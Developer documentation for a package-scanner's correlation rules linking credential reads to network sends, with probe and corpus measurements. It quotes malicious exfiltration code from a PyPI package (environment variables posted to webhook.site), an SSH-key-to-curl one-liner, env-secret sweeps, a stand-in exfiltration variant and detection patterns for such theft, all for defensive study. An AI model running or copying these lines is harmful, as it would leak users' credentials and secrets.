# Correlation chains

A correlation chain is a rule over *findings* rather than over file content
(`correlation_rules` in `cli/packs/core/v1/*.json`, applied by
`cli/src/scanner/correlate.rs::apply`). It fires when a source finding and a
sink finding sit in the same file, the source first and within the rule's
window, and what the source line produced reaches the sink. It is the one
place a pack can say "line 9 feeds line 10" without the engine executing
anything: the link is a text check, not taint analysis. `CONTRIBUTING.md`
("Correlation rules") has the schema; this page lists the built-in chains,
what each links through, and how a bound name is read.

## The built-in chains

| Chain | Severity | Source | Sink | Links through |
|---|---|---|---|---|
| `EXFIL-CHAIN-001` | Critical | any `CRED-*` finding | an outbound send: `NET-001`..`009`, `NET-012`, `NET-014`, `NET-UPLOAD-001` | the name the source line assigns, the handle of a file it opens for reading (`with open(<key file>) as keyfile`), or a file it writes; used in the sink line or the four lines after it. `sink_excludes`: `headers`, `Authorization`, `authorization`, `Bearer`, `bearer`, `x-api-key`, `X-Api-Key`, `auth=` in that window disqualify the link (an auth header is where a key legitimately goes) |
| `DROPPER-CHAIN-001` | High | a download: `NET-001`..`005`, `NET-012`, `NET-EXE-001`, `NET-RAWIP-001`, `AGENTSC-004` | `CODE-RUNFILE-001`, a launch of a program named by a variable | only a file the source line *wrote* (`open(PATH, 'wb')`, `urlretrieve(url, PATH)`, `curl -o "$OUT"`, `-OutFile`, a literal path such as `"/tmp/x.pyz"`), and only when the launch line itself names it |
| `AGENTSC-CHAIN-001` | Critical | `AGENTSC-010`, a secret-named environment sweep (`env \| grep TOKEN`) | an outbound send: `NET-001`..`009`, `NET-012`, `NET-014`, `SKILL-017`, `AGENTSC-012`, `AGENTSC-020` | the name the sweep is assigned to (`SECRETS=$(env \| grep ...)`), used in the sink line or the four lines after it |
| `AGENTSC-CHAIN-002` | High | `AGENTSC-011`, a project archive built without excluding `.env` | an upload: `NET-UPLOAD-001`, `AGENTSC-012`, `NET-001`..`005`, `NET-012` | the archive path `tar -c…f` writes (`"$TARBALL"`), used in the sink line or the four lines after it |
| `DESER-CHAIN-001` | High | `CODE-MODEL-001`, a pickle-format file resolved inside the package's own directory | `CODE-DESER-001`, `torch.load(..., weights_only=False)` | the name the path is assigned to (`model_path = os.path.join(os.path.dirname(__file__), "model.pt")`), used in the sink line or the four lines after it |
| `TLS-CHAIN-001` | High | a credential read or hardcoded key | a TLS-verification switch (`TLS-001`, `002`, `004`..`007`, `010`) | the sink's statement (`sink_window_before: 10`); see [insecure-transport.md](insecure-transport.md#the-credential-chain-tls-chain-001) |

A source and a sink on the same line link without a name. Every other link
goes through a name the source line binds.

## A name links only where it is used as a value

Every built-in chain sets `"name_uses": "value"`. The sink's window must
*use* the bound name, not only repeat it as a name something else is given:

- a keyword argument's name or an assignment target: `name=` (but not `==`);
- an object key: `name:` after `{`, `,`, `(` or at the start of a line (but
  not `::`), bare or quoted (`"name":`, `'name':`).

| Sink, with the name bound on an earlier line | Links? |
|---|---|
| `url` bound; `requests.get(url=base + "/ping")` | no: the call sends `base + "/ping"` |
| `token` bound; `requests.post(u, json={"token": "x"})` | no: the call sends `"x"` |
| `token` bound; `fetch(u, { body: JSON.stringify({ token: "anonymous" }) })` | no |
| `PATH` written by the download; `subprocess.run([sys.executable, build_script], env={"PATH": "/usr/bin"})` | no: the launch runs `build_script` |
| `api_key` bound; `requests.post(u, json={"k": api_key})` | yes |
| `token` bound; `data=token`, `f"...{token}"`, `requests.post(u, token)`, `token=token`, `params={"token": token}` | yes |
| `token` bound; `fetch(u, { body: token })`, `axios.post(u, { token })` | yes |
| `token` bound; `headers={"Authorization": token}` | the name is used, and `AGENTSC-CHAIN-001` (no `sink_excludes`) links it; `EXFIL-CHAIN-001` does not, because of its `sink_excludes`, as before |

Two f-string forms send the value but read as a name, and do not link: Python's
self-documenting `f"{token=}"` (it looks like an assignment) and a format spec,
`f"{token:>40}"` (it looks like a key after `{`). `f"{token!r}"` and
JavaScript's `` `${token}` `` are uses.

`"name_uses": "word"` links on any whole-word occurrence, keyword names and
keys included. That is how `EXFIL-CHAIN-001`, `DROPPER-CHAIN-001`,
`AGENTSC-CHAIN-001`, `AGENTSC-CHAIN-002` and `DESER-CHAIN-001` linked before
the field existed; `TLS-CHAIN-001` already read names as values, because its
statement window takes in whole calls. A rule that leaves the field out keeps
the behaviour it had: `"value"` with `sink_window_before`, `"word"` without
it. Custom packs are held to the same schema; any other value, or a misspelt
key on a correlation rule, is refused when the pack loads. The corpus digest
(`sigil scan --format json` reports it as `scanner.corpus_digest`, and the
scan cache is keyed on it) includes each chain's `name_uses`, so a scan cached
under one reading is not served under another.

### Why every chain reads values

The reading was switched chain by chain, each on a probe that links through a
keyword name or key with the old reading. The probes are hand-written files
(synthetic test inputs), scanned as directories with the release build of
cff3fa2 and with the build of this change; they are kept as tests in
`cli/src/corpus/engine.rs` (`reconcile`) and `cli/src/scanner/correlate.rs`.

| Chain | Probe that linked through a name (cff3fa2) | cff3fa2 | This change |
|---|---|---|---|
| `EXFIL-CHAIN-001` | `url = os.environ["DATABASE_URL"]`, `engine = create_engine(url)`, then `requests.get(url=base + "/ping")` in another function | CRITICAL RISK | LOW RISK |
| `EXFIL-CHAIN-001` | `token` read from the environment, then `requests.post(u, json={"token": "x"})` | CRITICAL RISK | LOW RISK |
| `EXFIL-CHAIN-001` | `const token = process.env.SERVICE_TOKEN`, then a login `fetch` whose body is `JSON.stringify({ token: "anonymous" })` | CRITICAL RISK | LOW RISK |
| `EXFIL-CHAIN-001` | the first probe with `url=status_base + "/health",` on its own line of a multi-line call | CRITICAL RISK | LOW RISK |
| `DROPPER-CHAIN-001` | a download written to `open(PATH, 'wb')`, then `subprocess.run([sys.executable, build_script], env={"PATH": "/usr/bin:/bin"})` | HIGH RISK | LOW RISK |
| `DROPPER-CHAIN-001` | a download written to `open(output, 'wb')`, then a launch with `env=dict(os.environ, output="1")` | HIGH RISK | LOW RISK |
| `AGENTSC-CHAIN-001` | `secrets = subprocess.check_output("env \| grep -E 'TOKEN\|SECRET'", ...)`, counted, and the count posted as `json={"secrets": count}` | CRITICAL RISK | HIGH RISK (AGENTSC-010 alone) |
| `AGENTSC-CHAIN-001` | the same in JavaScript, `axios.post(statusUrl, { secrets: n })` | CRITICAL RISK | HIGH RISK (AGENTSC-010 alone) |
| `AGENTSC-CHAIN-002` | `tar -czf "{archive}" --exclude=.git ...`, then `requests.post(upload_url, files={"archive": open(manifest_path, "rb")})` | HIGH RISK | MEDIUM RISK (AGENTSC-011 alone) |
| `DESER-CHAIN-001` | `labels_path` resolved to a bundled `labels.pkl` and read by `read_labels`; `torch.load(args.checkpoint, ..., weights_only=False)`; then `build_model(ckpt, labels_path=args.labels)` | HIGH RISK | LOW RISK |

`DROPPER-CHAIN-001` links only through written file paths, on the launch line
alone, so the question was whether a keyword name can reach it at all. It can:
the guardrails-ai dropper this chain was written for names its file `PATH`,
and `env={"PATH": ...}` on a launch line is ordinary. The two `DROPPER-CHAIN-001`
probes above linked a benign download to an unrelated launch.

38 probes were run. Besides the ten above:

- 23 value-side probes link with both builds, at the same verdict: the
  table's "yes" rows, a multi-line call, a read handle
  (`requests.post(..., data=keyfile.read())`), `f"{token!r}"`,
  `torch.load(f=model_path, ...)`, the shell `curl -d "$SECRETS"` sweep, a
  sweep sent in an `Authorization` header (AGENTSC-CHAIN-001 has no
  `sink_excludes`), the `-F "file=@$TARBALL"` upload, and the guardrails,
  durabletask, PowerShell and shell droppers.
- `requests.post(..., headers={"Authorization": token})` links with neither
  (EXFIL-CHAIN-001's `sink_excludes`).
- The two `TLS-CHAIN-001` probes (`url=` beside `verify=False`, and a token in
  the headers above `verify=False,`) give the same TLS result with both; the
  first was CRITICAL RISK with cff3fa2 through EXFIL-CHAIN-001 and is MEDIUM
  RISK (TLS-001) now.
- `f"{token=}"` and `f"{token:>40}"` linked with cff3fa2 and do not now: the
  cost described above.

## Measurements

Every corpus was scanned twice, sample by sample: with the release build of
cff3fa2 (the base) and with the release build of this change. The change's
digest commit does not change what is detected; the 38 probes give the same
result with the build before it and the build after it.

```
Data Source: Real samples. Clean MCP servers: 169 packages from the official MCP
             registry (evaluation_results/corpora/mcp_clean_manifest.json), and
             146 other popular registry servers not used for calibration (the
             holdout corpus; its manifest is on the ws/holdout branch).
             Skills: Datadog malicious-software-packages-dataset ai-skills
             bucket (204 malicious); anthropics, NVIDIA, openai and vercel-labs
             skill catalogs (455 clean). Datadog: run_eval.py's selection of
             the malicious-software-packages-dataset (--limit 204).
             SkillSpector's own test suite (the parity corpus).
Sample Size: 169 + 146 MCP servers; 204 malicious and 455 clean skills;
             844 Datadog malicious packages; 1,796 SkillSpector test
             examples.
Limitations: The MCP (169) and skills corpora are in-sample for the rules
             around the chains. No clean MCP server and no clean skill carried
             a chain this change could remove, so these corpora show that
             nothing else moved, not how often the removed false positive
             occurs in real code; the reported false positive and the probes
             (synthetic inputs) are the evidence for that. "Clean" means
             published by a vendor or in the registry, not audited. Datadog is
             malicious packages only, scanned with run_eval.py's six detection
             phases; its per-sample comparison is a script that imports
             run_eval.py's selection, extraction and reduction and runs its
             scan command with each build and an empty HOME.
```

| Corpus | cff3fa2 | This change | Samples whose level changed |
|---|---|---|---|
| Clean MCP servers (169) | 39 blocked, 125 warned, 163 with any finding | the same | none |
| Unseen MCP servers (146) | 80 blocked, 135 warned, 144 with any finding | the same | none |
| Malicious skills (204) | 173 blocked, 184 warned, 190 with any finding | the same | none |
| Clean skills (455) | 7 blocked, 71 warned, 224 with any finding | the same | none |
| Datadog malicious packages (844, run_eval.py's selection and phases) | detected at any severity 785, ≥ Medium 761, ≥ High 752, ≥ Critical 561 | the same | none (no sample changes its highest severity) |
| SkillSpector's test examples (1,796) | 626 flagged at any severity, 385 at High or above | the same | none (every example has the same rule set; EXFIL-CHAIN-001 fires on 9 with both builds) |

`scripts/run_eval.py --dataset datadog --limit 204` itself, run with this
change's final build (dataset commit 1dbcfc5), gives the same Datadog figures:
844 scanned, no extraction failure or scan error, 785 / 761 / 752 / 561 at any
/ Medium / High / Critical.

Blocked is HIGH or CRITICAL RISK, warned MEDIUM RISK or above. Every MCP
server and skill has the same rule set and finding count with both builds,
and every SkillSpector example the same rule set and highest severity; on
Datadog, 17 packages lose one finding each
([below](#what-was-lost-17-coincidental-links)). This change's per-sample
outputs are in `evaluation_results/skills_benchmark/` (`*_exfilchain*`; the
Datadog file lists the 17).

The chains that fire in these corpora fire the same way with both builds:

- **EXFIL-CHAIN-001**, four malicious skills. Three are same-line links in
  a SKILL.md (a `curl ... ?data=` line that also reads a credential, `cat
  ~/.ssh/id_rsa | curl -X POST -d @- ...`). The fourth is a link through a
  name used as a value: Cisco's exfiltrator sample binds `api_key =
  os.getenv("API_KEY", "")` (`analyze.py:32`) and posts `json={"data": data,
  "key": api_key}` (`:35`).
- **AGENTSC-CHAIN-002**, the four vercel-deploy copies:
  `tar -czf "$TARBALL" ...` reaches `curl ... -F "file=@$TARBALL"`.
- **TLS-CHAIN-001**, one clean skill (openai `render-deploy`), unchanged.
- **DROPPER-CHAIN-001**, two unseen MCP servers (`com.vibgrate__ai-context`,
  `dev.jasonpearson__auto-mobile`). Both are same-line links on a one-line
  `.js.map` source map (`NET-012 (@L1) reaches CODE-RUNFILE-001 (@L1)`), so
  they involve no name and this change cannot touch them; they are false
  positives of another kind (the legacy chains set no `max_line_length`). Both
  servers are CRITICAL RISK on other rules.

No MCP server or skill carries AGENTSC-CHAIN-001 or DESER-CHAIN-001 with
either build.

### What was lost: 17 coincidental links

On the Datadog selection, EXFIL-CHAIN-001 fires on 40 packages with cff3fa2
and on 23 with this change. The 17 it no longer fires on are one PyPI family:
artifact-lab-3-package and twelve renamed copies of it (13 names, 17
versions). Each has the same shape (in `setup.py`, or `artifact_lab_leak.py`
in one version):

```python
data = dict(os.environ)                               # CRED-ENV-001 binds `data`
print(data)
encoded_data = urllib.parse.urlencode(data).encode()
url = 'https://webhook.site/...'                      # NET-007, the sink
req = urllib.request.Request(url, data=encoded_data)  # the old link: the keyword `data=`
```

The environment really is sent, but in two hops (`data` → `encoded_data` →
the request), which the one-hop linker does not follow. The word reading
linked it because the keyword that carries the payload happens to share the
variable's name. None of the 17 changes its highest severity: the sink is
NET-007 (webhook.site, ngrok, oastify hosts), Critical on its own, and
INSTALL-001 is Critical too. Every other Datadog package has the same rule
set, finding count and highest severity with both builds, so every other
chain fires as before (EXFIL-CHAIN-001 on the other 23, DROPPER-CHAIN-001 on
7 packages, DESER-CHAIN-001 on 16, AGENTSC-CHAIN-002 on 4, TLS-CHAIN-001 on
1).

Where no other rule speaks for the file, the loss is a verdict. Three
constructed variants (synthetic inputs, scanned with both builds):

| Variant | cff3fa2 | This change |
|---|---|---|
| `data = dict(os.environ)`; `encoded_data = urlencode(data).encode()`; `requests.post("https://collect.example.net/c", data=encoded_data)` | CRITICAL RISK (EXFIL-CHAIN-001) | LOW RISK |
| the same with the variable called `env` | LOW RISK | LOW RISK |
| `data = dict(os.environ)`; `requests.post(..., data=data)` | CRITICAL RISK | CRITICAL RISK |

The first row is the cost of reading names as values; the second shows the
old link depended on the variable's name. `exfil_chain_does_not_follow_a_two_hop_flow`
in `cli/src/corpus/engine.rs` pins it. Following one intermediate assignment
would recover these; it is a change to the linking model rather than to how
names are read, and is left for separate measurement.
